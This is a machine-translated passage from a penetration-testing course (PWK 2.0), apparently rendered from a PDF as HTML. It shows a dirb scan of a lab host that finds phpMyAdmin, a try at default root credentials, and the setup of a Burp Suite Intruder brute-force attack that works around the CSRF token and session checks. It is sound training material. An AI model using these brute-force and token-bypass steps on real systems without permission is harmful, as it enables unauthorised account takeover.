<div style="position:absolute;top:66231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dirb http://10.11.0.22 -r</font></font></font></b></nobr></div>
<div style="position:absolute;top:66248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:66265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">URL_BASE：http://10.11.0.22/</font></font></nobr></div>
<div style="position:absolute;top:66282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WORDLIST_FILES：/usr/share/dirb/wordlists/common.txt</font></font></nobr></div>
<div style="position:absolute;top:66299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：不递归</font></font></nobr></div>
<div style="position:absolute;top:66333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------------</font></font></nobr></div>
<div style="position:absolute;top:66367;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成的单词：4612    </font></font></nobr></div>
<div style="position:absolute;top:66401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- 扫描网址：http://10.11.0.22/ ----</font></font></nobr></div>
<div style="position:absolute;top:66418;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:66435;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://10.11.0.22/lpt1（代码：403|尺寸：1047）</font></font></nobr></div>
<div style="position:absolute;top:66452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://10.11.0.22/lpt2（代码：403|尺寸：1047）</font></font></nobr></div>
<div style="position:absolute;top:66469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://10.11.0.22/nul (CODE:403|SIZE:1047)</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:66486;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==&gt; 目录：http://10.11.0.22/phpmyadmin/</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:66503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://10.11.0.22/prn (CODE:403|SIZE:1047)</font></font></nobr></div>
<div style="position:absolute;top:66520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://10.11.0.22/robots.txt (CODE:200|SIZE:79)</font></font></nobr></div>
<div style="position:absolute;top:66537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:66556;left:292"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 284 - 在我们的 Windows 10 实验室机器上运行 dirb </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:66703;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="57"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 57 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:66736;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:67813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:67813;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:67813;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">277</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:66832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出列出了几个有趣的 URL，包括突出显示的对</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">phpmyadmin 的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">引用</font><font style="vertical-align: inherit;">，一个</font></font></nobr></div>
<div style="position:absolute;top:66851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL数据库的管理工具，特别有趣。</font></font></nobr></div>
<div style="position:absolute;top:66884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的浏览器中输入相应的 URL 会生成一个 phpMyAdmin 登录页面：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:67391;left:354"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 118：phpMyAdmin 登录页面</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:67421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">快速 Internet 搜索表明 phpMYAdmin 的默认登录凭据包括“root”</font></font></nobr></div>
<div style="position:absolute;top:67441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用空白密码。</font><font style="vertical-align: inherit;">让我们针对我们的 Windows 10 目标尝试一下：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:67891;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="58"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 58 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:67924;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:69001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:69001;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:69001;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">278</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:68494;left:344"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 119：phpMyAdmin 错误消息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:68525;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们尝试这些凭据，我们会收到一条错误消息“无密码登录被禁止</font></font></nobr></div>
<div style="position:absolute;top:68544;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置”。</font><font style="vertical-align: inherit;">这是因为在 phpMyAdmin 中“AllowNoPassword”设置为 False</font></font></nobr></div>
<div style="position:absolute;top:68563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置文件 (C:\xampp\phpMyAdmin\config.inc.php)。</font><font style="vertical-align: inherit;">在这个配置下，我们需要</font></font></nobr></div>
<div style="position:absolute;top:68582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括登录密码，以便我们可以合理地假设密码不为空。</font><font style="vertical-align: inherit;">我们将有</font></font></nobr></div>
<div style="position:absolute;top:68602;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们想获得访问权限，请尝试其他方法。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:68636;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.2 Burp Suite 入侵者</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:68671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于默认凭据似乎不起作用并且不允许使用空白密码，让我们尝试</font></font></nobr></div>
<div style="position:absolute;top:68690;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Burp Suite 的 Intruder </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">252</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具</font><font style="vertical-align: inherit;">自动化一些基本的用户名和密码组合</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:68710;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请记住，此功能在 Burp 社区版中是有时间限制的。</font><font style="vertical-align: inherit;">尽管如此，</font></font></nobr></div>
<div style="position:absolute;top:68729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们仍然可以使用它来解释一些重要的概念。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:68951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">252 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（PortSwigger，2019 年），https://portswigger.net/burp/documentation/desktop/tools/intruder/using</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:69079;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="59"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 59 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:69112;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:70189;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:70189;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:70189;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">279</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:69202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.2.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:69223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们从浏览器发送一些手动登录尝试并查看 Burp Suite 中的响应。</font></font></nobr></div>
<div style="position:absolute;top:69242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在以下屏幕截图中将三个请求组合在一起：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:69689;left:326"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 120：PHP My Admin 的登录请求</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:69720;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据输出，这个测试可能并不简单，因为我们有几个因素</font></font></nobr></div>
<div style="position:absolute;top:69740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与之抗衡。</font><font style="vertical-align: inherit;">正如我们从请求中看到的，登录表单包含一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">令牌</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">253</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以防止</font></font></nobr></div>
<div style="position:absolute;top:69759;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">蛮力和其他攻击。</font><font style="vertical-align: inherit;">另外我们可以看到表单设置了一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">set_session</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数</font></font></nobr></div>
<div style="position:absolute;top:69778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每个请求都是唯一的。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:70139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">253 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Cross-site_request_forgery#Synchronizer_token_pattern</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:70267;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="60"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 60 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:70300;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:71377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:71377;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:71377;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">280</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:70390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.2.2</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:70411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们更改</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">set_session</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数并且它与</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">phpMyAdmin</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> cookie</font><font style="vertical-align: inherit;">的值不匹配</font><font style="vertical-align: inherit;">，</font></font></nobr></div>
<div style="position:absolute;top:70430;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该站点将返回错误：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:70937;left:249"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 121：会话值不匹配的 phpMyAdmin 错误消息 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:71455;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="61"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 61 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:71488;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:72565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:72565;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:72565;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">281</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:71578;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.2.3</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:71599;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们想要成功登录，我们需要避免这个错误。</font><font style="vertical-align: inherit;">如果我们查看 HTML 源代码</font></font></nobr></div>
<div style="position:absolute;top:71618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录表单，我们会发现</font><font style="vertical-align: inherit;">响应中包含</font><font style="vertical-align: inherit;">新的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">set_session</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">令牌</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:72098;left:360"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 122：登录值更改</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:72129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了克服这种保护措施，并确保值匹配，我们可以自动化</font></font></nobr></div>
<div style="position:absolute;top:72148;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">向入侵者请求。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:72643;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="62"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 62 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:72676;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:73753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:73753;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:73753;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">282</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:72766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.2.4</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:72787;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，我们必须先提交一个登录请求，让 Intruder 进行分析。</font><font style="vertical-align: inherit;">我们可以通过导航来做到这一点</font></font></nobr></div>
<div style="position:absolute;top:72806;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Proxy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP History</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，右键点击 POST 请求到“/phpmyadmin/index.php”，然后</font></font></nobr></div>
<div style="position:absolute;top:72825;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发送给入侵者</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:73256;left:380"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 123：发送给入侵者</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:73287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在，当我们单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Intruder</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项卡时，我们发现它包含多个请求子选项卡。</font></font></nobr></div>
<div style="position:absolute;top:73306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这些下，我们会发现四个额外的子选项卡：</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Target</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Positions</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Payloads</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Options</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">让我们</font></font></nobr></div>
<div style="position:absolute;top:73325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查这些以</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Target</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开头</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:73547;left:383"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 124：入侵者目标</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:73578;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此选项卡上的信息是根据请求预先填充的，因此我们将保留这些值。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:73831;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="63"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 63 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:73864;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:74941;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:74941;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:74941;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">283</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:73954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.2.5</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:73975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，让我们回顾一下</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Positions</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项卡</font><font style="vertical-align: inherit;">的内容</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:74293;left:375"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 125：入侵者位置</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74323;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们使用此选项卡来标记我们希望 Burp Suite 在攻击发生时向哪些字段注入有效载荷</font></font></nobr></div>
<div style="position:absolute;top:74343;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跑步。</font><font style="vertical-align: inherit;">Burp Suite 会自动将 cookie 值和 POST body 值标记为有效负载位置</font></font></nobr></div>
<div style="position:absolute;top:74362;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用节符号 (§) 作为分隔符。</font><font style="vertical-align: inherit;">但是，我们不想使用所有这些默认位置</font></font></nobr></div>
<div style="position:absolute;top:74381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所以我们将使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Clear §</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清除它们</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:74414;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pma_username</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置为“root”，因为这是我们的目标用户帐户。</font><font style="vertical-align: inherit;">还有四个</font></font></nobr></div>
<div style="position:absolute;top:74434;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将修改值以提交登录尝试。</font><font style="vertical-align: inherit;">我们将插入实际尝试</font></font></nobr></div>
<div style="position:absolute;top:74453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过选择值并单击</font><i><font style="vertical-align: inherit;">添加 §</font></i><font style="vertical-align: inherit;">将</font><font style="vertical-align: inherit;">密码转换为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pma_password</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">该</font><i><font style="vertical-align: inherit;">phpMyAdmin的</font></i><font style="vertical-align: inherit;">饼干</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:74472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">value 和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">set_session</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在每个请求上发布正文值更改，因此我们需要将它们添加为有效负载</font></font></nobr></div>
<div style="position:absolute;top:74492;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">职位也是如此。</font><font style="vertical-align: inherit;">最后，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">令牌</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值也会随着每个请求而变化，以防止暴力破解</font></font></nobr></div>
<div style="position:absolute;top:74511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们需要选择它的值并点击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加§</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:75019;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="64"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 64 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:75052;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:76129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:76129;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:76129;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">284</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:75142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.2.6</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
